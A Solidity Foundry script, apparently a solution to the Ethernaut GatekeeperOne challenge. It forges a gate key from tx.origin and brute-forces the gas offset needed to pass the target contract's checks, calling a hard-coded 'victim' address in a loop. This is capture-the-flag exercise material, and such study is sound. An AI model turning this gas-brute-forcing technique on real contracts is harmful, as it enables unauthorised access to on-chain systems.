// SDPX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

import {GatekeeperOne} from "../src/GatekeeperOne.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperOneGasCalculator is Script {
    uint256 private constant BASE_GAS = 50000;
    uint256 private constant TARGET_GAS_LEFT = 8191;

    function run() public {
        address attackerAddress = 0xCDc986e956f889b6046F500657625E523f06D5F0;
        address victimAddress = 0xbc54EDE06C72a963b6ad27fb057EF4bE476ab97c;

        vm.startBroadcast(attackerAddress);
        IGatekeeperOne victim = IGatekeeperOne(victimAddress);
        vm.stopBroadcast();

        uint256 gasOffset = findGasOffset(victim);

        console.log("Found gas offset! ");
        console.log(gasOffset);
    }
    
    function findGasOffset(IGatekeeperOne victim) internal returns (uint256) {
        bytes8 gateKey = bytes8(uint64((uint32(0x1100) << (4*4)) + uint16(uint160(tx.origin))));

        for (uint256 i = 0; i <= TARGET_GAS_LEFT; i++) {
            try victim.enter{gas: BASE_GAS + i}(gateKey) {
                return i; // Found it!
            } catch Error(string memory reason) {
                if (keccak256(bytes(reason)) == keccak256("GatekeeperOne: invalid gateThree part one") ||
                    keccak256(bytes(reason)) == keccak256("GatekeeperOne: invalid gateThree part two") ||
                    keccak256(bytes(reason)) == keccak256("GatekeeperOne: invalid gateThree part three")) {
                    // console.log("gateThree failed, but gateTwo passed at offset:", Strings.toString(i));
                    return i;
                }
            } catch (bytes memory lowLevelData) {
                if (i % 500 == 0) {  // Log every 500 iterations
                    console.log("Low-level revert at offset", i, "data length:", lowLevelData.length);
                }
            }
        }

        revert("Gas offset not found");
    }
}
